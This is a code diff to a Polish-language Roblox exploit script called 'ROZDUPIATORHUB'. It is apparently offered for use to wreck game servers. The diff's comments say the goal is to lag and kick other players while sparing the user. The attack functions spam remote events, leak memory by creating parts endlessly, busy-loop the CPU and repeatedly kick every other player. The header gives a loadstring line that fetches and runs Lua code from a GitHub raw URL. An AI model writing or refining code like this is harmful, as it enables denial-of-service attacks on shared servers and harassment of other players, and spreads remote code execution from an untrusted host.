@@ -2,7 +2,7 @@
     Link do uruchomienia:
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Plakalhub/rozdupiator/refs/heads/main/PlakalHub.lua'))()
 
-    ROZDUPIATORHUB – niszczenie serwera z GUI
+    ROZDUPIATORHUB – laguje innych, nie Ciebie
 ]]
 
 -- tworzenie GUI
@@ -15,8 +15,8 @@ gui.Parent = game.CoreGui
 
 frame.Name = "Frame"
 frame.Parent = gui
-frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- białe tło
-frame.BorderColor3 = Color3.fromRGB(0, 0, 0) -- czarny kontur
+frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 frame.BorderSizePixel = 3
 frame.Position = UDim2.new(0.4, 0, 0.4, 0)
 frame.Size = UDim2.new(0, 200, 0, 60)
@@ -25,7 +25,7 @@ frame.Draggable = true
 
 button.Name = "ZniszczSerwer"
 button.Parent = frame
-button.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- czerwony
+button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 button.BorderColor3 = Color3.fromRGB(0, 0, 0)
 button.BorderSizePixel = 2
 button.Size = UDim2.new(0, 180, 0, 40)
@@ -35,7 +35,10 @@ button.TextColor3 = Color3.fromRGB(255, 255, 255)
 button.TextSize = 18
 button.Font = Enum.Font.SourceSansBold
 
--- funkcje ataku
+-- Twój gracz (nie będziesz lagowany/wyrzucany)
+local localPlayer = game.Players.LocalPlayer
+
+-- spam zdarzeniami zdalnymi (lag dla innych)
 local function spamZdalne()
     local repStorage = game:GetService("ReplicatedStorage")
     for _, obiekt in ipairs(repStorage:GetChildren()) do
@@ -51,6 +54,7 @@ local function spamZdalne()
     end
 end
 
+-- wyciek pamięci (lag dla innych – tworzy części w workspace)
 local function wyciekPamieci()
     local czesci = {}
     while true do
@@ -61,6 +65,7 @@ local function wyciekPamieci()
     end
 end
 
+-- zapętlenie (obciążenie CPU – dla innych)
 local function zapetlenie()
     local x = 0
     while true do
@@ -69,21 +74,26 @@ local function zapetlenie()
     end
 end
 
+-- wyrzucanie innych graczy (pomija Ciebie)
+local function wyrzucInnych()
+    while true do
+        for _, gracz in ipairs(game.Players:GetPlayers()) do
+            if gracz ~= localPlayer then
+                pcall(function()
+                    gracz:Kick("Serwer zniszczony przez ROZDUPIATORHUB")
+                end)
+            end
+        end
+        task.wait(0.1)
+    end
+end
+
 local function zniszczSerwer()
     spawn(spamZdalne)
     spawn(wyciekPamieci)
     spawn(zapetlenie)
     task.wait(0.5)
-    spawn(function()
-        while true do
-            for _, gracz in ipairs(game.Players:GetPlayers()) do
-                pcall(function()
-                    gracz:Kick("Serwer zniszczony przez ROZDUPIATORHUB")
-                end)
-            end
-            task.wait(0.1)
-        end
-    end)
+    spawn(wyrzucInnych)
 end
 
 button.MouseButton1Click:Connect(zniszczSerwer)
